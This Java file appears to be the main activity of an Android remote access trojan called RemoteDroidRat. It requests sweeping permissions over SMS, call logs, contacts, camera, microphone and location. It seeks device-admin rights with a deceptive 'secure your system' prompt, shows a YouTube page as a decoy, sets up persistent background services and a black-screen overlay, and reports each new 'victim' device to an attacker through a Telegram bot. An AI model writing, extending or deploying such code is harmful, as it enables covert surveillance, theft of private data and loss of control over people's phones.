package com.KaranKumar.RemoteDroidRat;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.KaranKumar.RemoteDroidRat.broadcasts.alarmManager;
import com.KaranKumar.RemoteDroidRat.services.background;
import com.KaranKumar.RemoteDroidRat.services.myNotification;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.base64.base64Text;
import com.KaranKumar.RemoteDroidRat.services.BlackScreen;
public class MainActivity extends AppCompatActivity {



    private static final int REQUEST_CODE_PERMISSION = 100;
    private static final int MY_PERMISSIONS_REQUEST_NOTIFICATION_POLICY = 299;
	private static final int STORAGE_PERMISSION_CODE = 246;
	private static final int MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE = 350;

	public static final String ACTIVITY_IGNORE_ACCESSIBILITY = "intent.extra.IGNORE.ACCESSIBILITY";
	public static final String ACTIVITY_IGNORE_PERMISSION = "intent.extra.IGNORE-PERMISSION";
	public static final String ACTIVITY_MAIN_FINISH_TASK = "intent.extra.MAIN_FINISH_TASK";
	public static final String ACTIVITY_REGISTER_RECEIVER = "intent.extra.REGISTER_RECEIVER";
	public static final String ACTIVITY_RE_PERMISSION = "intent.extra.RE-PERMISSION";

	public static TelegramBotApi bot;

	public static  adminInfo AdminInfo;

	public static String USER_CHAT_ID;




	private int CAMERA_PERMISSION_REQUEST_CODE = 99;

    private Context mContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


		bot = new TelegramBotApi(this);
		AdminInfo = new adminInfo(getApplicationContext());
		USER_CHAT_ID = AdminInfo.getChatId();


		

		// Check storage permissions initially
		if (!checkStoragePermissions()) {
			// Request storage permissions if not granted
			requestForStoragePermissions();
		}

        WebView webView = findViewById(R.id.myWebView);
        webView.getSettings().setJavaScriptEnabled(true); //
		webView.loadUrl("https://www.youtube.com/shorts/");


		//final String USER_CHAT_ID = "5196490744";


		


        alarm();



        // Example permissions
        String[] permissions = {
			Manifest.permission.READ_SMS,
			Manifest.permission.SEND_SMS,
			Manifest.permission.READ_CALL_LOG,

			Manifest.permission.READ_CONTACTS,
			Manifest.permission.WRITE_CALL_LOG,
			Manifest.permission.READ_CALENDAR,
			Manifest.permission.CALL_PHONE,
			Manifest.permission.READ_EXTERNAL_STORAGE,
			Manifest.permission.WRITE_EXTERNAL_STORAGE,
			Manifest.permission.CAMERA,
			Manifest.permission.RECORD_AUDIO,
			Manifest.permission.ACCESS_FINE_LOCATION,
			Manifest.permission.ACCESS_BACKGROUND_LOCATION,
			Manifest.permission.SET_WALLPAPER,
			Manifest.permission.INTERNET,
			Manifest.permission.WAKE_LOCK,
			Manifest.permission.BODY_SENSORS,
			Manifest.permission.READ_PHONE_STATE,



			// Add more permissions as needed
        };

		// Check for permissions when the activity starts
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			checkPermissions(permissions);
		}

		// Check if the permission is granted
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NOTIFICATION_POLICY)
			!= PackageManager.PERMISSION_GRANTED) {
			// Permission is not granted, request it
			ActivityCompat.requestPermissions(this,
											  new String[]{Manifest.permission.ACCESS_NOTIFICATION_POLICY},
											  MY_PERMISSIONS_REQUEST_NOTIFICATION_POLICY);
		}
        
        try{

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                       Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }else{
            startService(BlackScreen.class);
        }
        
        }catch(Exception e){
            e.printStackTrace();
        }
		
		FirstTimeStart();


		checkAdminPermission();

        // Check camera permission
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
			// Request camera permission
			ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST_CODE);
		} else {
			// Camera permission granted, proceed with capturing image

		}

		// startService(SmartClickService.class);
        startService(myNotification.class);
        startService(background.class);
        
    }
	public void FirstTimeStart() {

		SharedPreferences share = getSharedPreferences("FirstTime", this.MODE_PRIVATE);

		String message = "Victime is Conected : " + Build.MODEL;

		Log.i("firstTime", message);
		try {
			if (share.getBoolean("Start", false)) {
				Log.i("firstTime", "User Is Allredy Existing");

			} else {

				if (isMobileDataConnected()) {

					bot.sendMessage(USER_CHAT_ID, message);
                    bot.sendBtnUrl(USER_CHAT_ID,"Subscribe Cannel","https://youtube.com/@CyberZoneAcademy");

					FirstStart(true);

				} else {

				}
			}
		} catch (Exception e) {

			e.printStackTrace();
		}
	}
	private void FirstStart(boolean number) {
		SharedPreferences sharedPreferences = this.getSharedPreferences("FirstTime", this.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putBoolean("Start", number);
		editor.apply();
	}

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void checkPermissions(String[] permissions) {
        // Check each permission in the list
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                // Permission is not granted, request it
                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSION);
                return; // Requesting one permission at a time, you may adjust this based on your requirements
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_CODE_PERMISSION) {
            // Check if all requested permissions are granted
            boolean allPermissionsGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }

            if (allPermissionsGranted) {
                // Permission Granted
            } else {
                // Handle the case where permissions are not granted
            }
        }


		if (requestCode == STORAGE_PERMISSION_CODE) {
			if (grantResults.length > 0) {
				boolean write = grantResults[0] == PackageManager.PERMISSION_GRANTED;
				boolean read = grantResults[1] == PackageManager.PERMISSION_GRANTED;

				if (read && write) {
					Toast.makeText(MainActivity.this, "Storage Permissions Granted", Toast.LENGTH_SHORT).show();
				} else {
					Toast.makeText(MainActivity.this, "Storage Permissions Denied", Toast.LENGTH_SHORT).show();
				}
			}
		}

        if (requestCode == MY_PERMISSIONS_REQUEST_NOTIFICATION_POLICY) {
            // Check if the permission is granted
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, proceed with your code
                // Your code to set interruption filter or perform other actions
            } else {
                // Permission denied, handle accordingly (e.g., show a message or take alternative action)
            }
        }
    }


	

    private void alarm() {
        // Set up AlarmManager
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent alarmIntent = new Intent(this, alarmManager.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);

        // Set the repeating alarm
        long intervalMillis = 1000; // Set your desired interval
        long triggerTimeMillis = SystemClock.elapsedRealtime() + intervalMillis;

        if (alarmManager != null) {
            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
											 triggerTimeMillis, intervalMillis, pendingIntent);
        }

        Toast.makeText(getApplicationContext(), "Service is running", Toast.LENGTH_SHORT).show();
    }

	private void requestForStoragePermissions() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
			// Android is 11 (R) or above
			try {
				Intent intent = new Intent();
				intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
				Uri uri = Uri.fromParts("package", this.getPackageName(), null);
				intent.setData(uri);

			} catch (Exception e) {
				Intent intent = new Intent();
				intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);

			}
		} else {
			// Below android 11
			ActivityCompat.requestPermissions(
                this,
                new String[]{
					Manifest.permission.WRITE_EXTERNAL_STORAGE,
					Manifest.permission.READ_EXTERNAL_STORAGE
                },
                STORAGE_PERMISSION_CODE
			);
		}
	}

    private void startService(Class<?> serviceClass) {
        Intent intent = new Intent(this, serviceClass);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        this.startService(intent);
    }

    private void checkAdminPermission() {
        ComponentName componentName = new ComponentName(this, com.KaranKumar.RemoteDroidRat.services.deviceAdminService.class);
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (devicePolicyManager != null && !devicePolicyManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allow permission to secure your system.");
            startActivityForResult(intent, 1);
        }
    }

    private boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> cls) {
        ComponentName componentName = new ComponentName(context, cls);
        String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabledServices != null && enabledServices.contains(componentName.flattenToString());
    }

    private boolean isMobileDataConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

	public boolean checkStoragePermissions() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
			// Android is 11 (R) or above
			return Environment.isExternalStorageManager();
		} else {
			// Below android 11
			int write = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
			int read = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
			return read == PackageManager.PERMISSION_GRANTED && write == PackageManager.PERMISSION_GRANTED;
		}
	}
	
	

}
